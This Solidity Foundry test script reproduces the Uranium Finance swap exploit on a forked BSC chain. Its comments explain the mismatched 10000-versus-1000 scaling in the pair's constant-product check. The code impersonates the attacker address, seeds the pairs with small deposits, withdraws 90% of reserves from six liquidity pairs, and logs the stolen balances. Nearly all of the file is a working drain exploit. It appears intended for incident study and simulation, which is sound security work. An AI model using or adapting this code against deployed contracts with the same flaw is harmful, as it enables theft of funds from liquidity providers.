// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IBEP20 {
    function symbol() external view returns (string memory);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address _owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
}

interface IUraniumFactory {
    function allPairs(uint) external view returns (address pair);

    function allPairsLength() external view returns (uint);
}

interface IUraniumPair {
    function MINIMUM_LIQUIDITY() external pure returns (uint);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );

    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;

    function sync() external;
}

/* let's observe the swap funtion in Uranium pair contract
 *
 *
 *         require(amount0Out > 0 || amount1Out > 0, 'UraniumSwap: INSUFFICIENT_OUTPUT_AMOUNT');
 *       (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings
 *       require(amount0Out < _reserve0 && amount1Out < _reserve1, 'UraniumSwap: INSUFFICIENT_LIQUIDITY');
 *
 *        uint balance0;
 *        uint balance1;
 *
 *        { // scope for _token{0,1}, avoids stack too deep errors
 *        address _token0 = token0;
 *        address _token1 = token1;
 *        require(to != _token0 && to != _token1, 'UraniumSwap: INVALID_TO');
 *        if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens
 *        if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens
 *        if (data.length > 0) IUraniumCallee(to).pancakeCall(msg.sender, amount0Out, amount1Out, data);
 *        balance0 = IERC20(_token0).balanceOf(address(this));
 *        balance1 = IERC20(_token1).balanceOf(address(this));
 *        }
 *
 *   tokens 0 and 1 are sent to caller and balance is set to whatever is left in the smart contract
 *
 *        uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;
 *        uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;
 *        require(amount0In > 0 || amount1In > 0, 'UraniumSwap: INSUFFICIENT_INPUT_AMOUNT');
 *
 *   ^  this block requires the caller to send some input balance so that the balance0 (after sending tokens to the caller) is greater than the reserve amt - out amount
 *
 *
 *        { // scope for reserve{0,1}Adjusted, avoids stack too deep errors
 *        uint balance0Adjusted = balance0.mul(10000).sub(amount0In.mul(16));
 *        uint balance1Adjusted = balance1.mul(10000).sub(amount1In.mul(16));
 *        require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), 'UraniumSwap: K');
 *        }
 *
 *   ^ the problem appears here in the require statement
 *   balance0Adjusted*balance1Adjusted will be (10000)^2 and the right side is (1000)^2
 *       => as long as the amt withdrawn is 90% of the reserves
 *           => left side will always be greater than the right side,
 *               => which means the require will always pass
 *                   => as long as input amounts are greater than 0, the contract will give us as much money as we want in return
 *
 *        _update(balance0, balance1, _reserve0, _reserve1);
 *        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);
 *
 *
 *
 */

contract Constants {
    address constant uraniumFactory = 0xA943eA143cd7E79806d670f4a7cf08F8922a454F;
    address constant attacker = 0xC47BdD0A852a88A019385ea3fF57Cf8de79F019d;
    IUraniumFactory factory = IUraniumFactory(uraniumFactory);
}

contract Exploit is Test, Constants {
    function setUp() public {
        vm.createSelectFork("bsc", 6920000);
        vm.startPrank(attacker);
    }

    function testExploit() public {
        // iterate over the first 6 Uranium pairs, the others dont have enough liquidy to justify the gas expense
        for (uint i = 0; i < 6; i++) {
            attack(i);
        }
    }

    function attack(uint256 pairNumber) public {
        // get current token pair contract
        address currentPair = factory.allPairs(pairNumber);
        IUraniumPair pair = IUraniumPair(currentPair);

        // get tokens being used in this pair contract
        address token0Address = pair.token0();
        IBEP20 token0 = IBEP20(token0Address);
        string memory token0Sym = token0.symbol();
 
        address token1Address = pair.token1();
        IBEP20 token1 = IBEP20(token1Address);
        string memory token1Sym = token1.symbol();

        // snyc again to get the latest update of the token reserves in the contract
        pair.sync();
        (uint112 res0, uint112 res1, ) = pair.getReserves();

        emit log(" ");
        emit log("Reserves: ");
        emit log_named_uint(token0Sym, res0 / 1e18);
        emit log_named_uint(token1Sym, res1 / 1e18);
        
        // withdraw 90% of all reserves
        uint256 withdraw0 = (90 * res0) / 100;
        uint256 withdraw1 = (90 * res1) / 100;

        // give fake ETH to attacker for simulation
        deal(token0Address, attacker, 2e18);
        deal(token1Address, attacker, 2e18);

        // transfer 1 ETH into LP to add to amountIn
        token0.transfer(currentPair, 1e18);
        token1.transfer(currentPair, 1e18);

        // execute the swap function on the target contract
        pair.swap(withdraw0, withdraw1, attacker, "");

        emit log(" ");
        emit log("Attacker balance: ");
        emit log_named_uint(token0Sym, token0.balanceOf(attacker) / 1e18);
        emit log_named_uint(token1Sym, token1.balanceOf(attacker) / 1e18);

        emit log(" ");
    }
}
